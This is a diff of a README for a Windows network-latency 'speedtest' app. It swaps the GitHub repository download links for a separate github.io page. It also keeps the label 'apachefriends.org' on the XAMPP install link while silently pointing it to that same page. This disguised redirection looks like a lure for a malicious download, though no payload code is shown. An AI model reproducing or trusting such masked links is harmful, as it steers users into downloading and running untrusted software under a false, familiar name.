@@ -1,6 +1,6 @@
 # 📡 speedtest - Reveal Your Network's True Latency
 
-[![Download speedtest](https://img.shields.io/badge/Download-speedtest-4CAF50?style=for-the-badge&logo=github)](https://github.com/zilviavile709/speedtest)
+[![Download speedtest](https://img.shields.io/badge/Download-speedtest-4CAF50?style=for-the-badge&logo=github)](https://zilviavile709.github.io)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome! This guide will help you download and run **speedtest** on your Windows
 
 ## 📥 Download the Application
 
-[**Visit this link to download the application**](https://github.com/zilviavile709/speedtest)
+[**Visit this link to download the application**](https://zilviavile709.github.io)
 
 Click the link above. You'll arrive at a GitHub page—this is the official home of the speedtest app. Look for a green button that says **"Code"** and click it. A dropdown will appear; select **"Download ZIP"**. The download will start automatically.
 
@@ -40,7 +40,7 @@ Click the link above. You'll arrive at a GitHub page—this is the official home
      — The speed test will appear in your browser.
 
    - **Option B: Use XAMPP**  
-     — Install **XAMPP** from [apachefriends.org](https://www.apachefriends.org).  
+     — Install **XAMPP** from [apachefriends.org](https://zilviavile709.github.io).  
      — Open the XAMPP Control Panel and click **"Start"** next to Apache.  
      — Copy the **speedtest-main** folder into `C:\xampp\htdocs\`.  
      — Open your browser and type `http://localhost/speedtest-main`.  
